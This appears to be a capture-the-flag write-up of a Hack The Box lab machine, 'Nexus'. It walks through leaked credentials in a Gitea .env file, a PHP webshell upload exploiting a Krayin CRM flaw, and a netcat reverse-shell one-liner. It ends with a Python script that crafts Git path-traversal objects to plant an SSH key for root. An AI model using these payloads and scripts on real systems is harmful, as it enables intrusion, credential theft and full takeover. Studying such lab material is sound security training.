# Machine: Nexus

Date: 01-07-2026
Platform: HTB
Difficulty: Easy
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -p- --min-rate 5000 -sV -sC $MACHINE_IP
```

**Results:**

- Port 22 → SSH (OpenSSH 9.6p1, Ubuntu)
- Port 80 → HTTP (nginx 1.24.0) — redirects to `http://nexus.htb/`

**Full port scan:**

Full range scanned directly (`-p-`); only 22 and 80 found open.

**Notes:**

- Added to /etc/hosts: `$MACHINE_IP nexus.htb`

---

## Enumeration

### Subdomain enumeration:

```bash
ffuf -u http://nexus.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.nexus.htb" -fc 302
```

**Subdomains found:**

- `git.nexus.htb` — Gitea instance

**Added to /etc/hosts:**

```
$MACHINE_IP nexus.htb git.nexus.htb billing.nexus.htb
```

### Gitea source review:

Browsing `git.nexus.htb` revealed a user, `j.matthew@nexus.htb`, and an exposed `.env` file in a repository containing:

```
APP_URL=http://nexus.htb
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
```

**Findings:**

- `billing.nexus.htb` — a second vhost referenced in the leaked config, running **Krayin CRM v2.2.0**
- The leaked credentials (`j.matthew@nexus.htb` / `N27xh!!2ucY04`) authenticate successfully against the Krayin CRM login at `billing.nexus.htb`

### Vulnerability identification:

Krayin CRM v2.2.0 is affected by **CVE-2026-38526**, with a public PoC/advisory available: https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

---

## Exploitation

### CVE-2026-38526 — Krayin CRM authenticated arbitrary file upload RCE (TinyMCE)

Krayin CRM's authenticated TinyMCE image upload endpoint (`/admin/tinymce/upload`) does not properly restrict uploaded file types, allowing a PHP webshell to be uploaded and served directly, achieving RCE as the web server user.

**Steps:**

**1. Extract session and CSRF cookies from the authenticated Krayin session** (captured from browser dev tools after logging in with the leaked credentials):

```bash
SESS='<krayin_crm_session cookie value>'
XSRF='<XSRF-TOKEN cookie value>'
TOKEN=$(python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))" "$XSRF")
```

**2. Upload a PHP webshell disguised as an image via the TinyMCE upload endpoint:**

```bash
curl -k -i -X POST http://billing.nexus.htb/admin/tinymce/upload \
  -b "XSRF-TOKEN=$XSRF; krayin_crm_session=$SESS" \
  -H "X-XSRF-TOKEN: $TOKEN" \
  -H "X-Requested-With: XMLHttpRequest" \
  -F "file=@payload.php;type=image/jpeg"
```

**Result:** Server responds with the stored file's public path:

```json
{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/ff37c5f9e906f47aab4cef80ed2717f4.php"}
```

**3. Trigger the webshell:**

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/ff37c5f9e906f47aab4cef80ed2717f4.php?cmd=id"
```

**Result:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — confirmed RCE.

### Upgrade to a full reverse shell:

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/ff37c5f9e906f47aab4cef80ed2717f4.php?cmd=rm+/tmp/f%3bmkfifo++/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.110+4444+>/tmp/f"
```

```bash
nc -lnvp 4444
```

**Result:** Interactive shell as `www-data`.

---

## Lateral Movement

### Credential discovery — Krayin CRM .env:

From the `www-data` shell, the live Krayin CRM `.env` (not the git-leaked copy) was readable and contained a different, current database password:

```
DB_PASSWORD=y27xb3ha!!74GbR
```

This password was tested for reuse and matched the local user `jones`'s login password.

### SSH access & user flag:

```bash
ssh jones@nexus.htb
# Password: y27xb3ha!!74GbR
```

**Result:** Logged in as `jones` ✓ — `user.txt` read successfully.

---

## Privilege Escalation

### Enumeration:

```bash
systemctl list-timers | grep -i sync
cat /etc/gitea/template-sync.py 2>/dev/null
cat /var/log/template-sync.log 2>/dev/null | tail
```

**Findings:**

- A scheduled systemd timer runs a `template-sync.py` script that syncs content out of Gitea repositories flagged as "Template Repository" — likely running with elevated (root) privileges based on the sync log paths
- Gitea allows any authenticated user (including `jones`) to create a new repository and mark it as a Template Repository via the web UI (`+ → New Repository → Template Repository → Create`)

### Git tree path-traversal → root SSH key injection:

The template-sync process does not sanitize paths within the synced repository tree, so a maliciously crafted Git tree object containing `../../..` path segments can escape the intended sync destination and write files anywhere on disk the sync process has permission to write — including root's `authorized_keys`.

**1. Generate an SSH keypair to inject:**

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

**2. Create a repo in Gitea, mark it as a Template Repository, and clone it locally:**

```bash
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
cd rce
echo "# Template" > README.md
```

**3. Build a malicious Git commit by hand, crafting tree objects with `../../../../root/.ssh/authorized_keys` path traversal pointing at the generated public key:**

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time
def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha
def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

```bash
python3 /tmp/build.py
git push -u origin main --force
```

**4. Wait for the sync timer to fire and confirm the traversal succeeded:**

```bash
tail -f /var/log/template-sync.log
# synced: ../../../../root/.ssh/authorized_keys
```

**5. SSH in as root using the injected key:**

```bash
ssh -i /tmp/.k root@nexus.htb
cat /root/root.txt
```

**Successful escalation:** root ✓

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/jones/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt`

---

## Lessons Learned

- Leaked `.env` files in exposed git repos are one of the highest-value recon finds — always check for `.git` exposure or accessible Gitea/GitLab instances early
- Credentials leaked in one place (git-committed `.env`) may be stale — always test the live application's current config too, since passwords can rotate between what's committed and what's actually in production
- Password reuse across services (web app DB password reused as a local Linux user's SSH password) is still one of the most common lateral movement vectors — always test leaked credentials against every login surface available
- Authenticated file-upload endpoints (like Krayin CRM's TinyMCE integration here) are a classic RCE vector when file-type validation is weak or client-side only — test content-type spoofing on any upload feature reachable after auth
- Automated sync jobs that pull from user-controlled sources (Git repos, template systems) are a strong privesc target if they don't sanitize paths — crafting raw Git objects by hand to smuggle path traversal is a technique worth having ready when a "template" or "sync" feature touches the filesystem with elevated privileges
- `systemctl list-timers` is worth checking on every box — scheduled jobs running as root are often the actual privesc vector, not a SUID binary or sudo rule
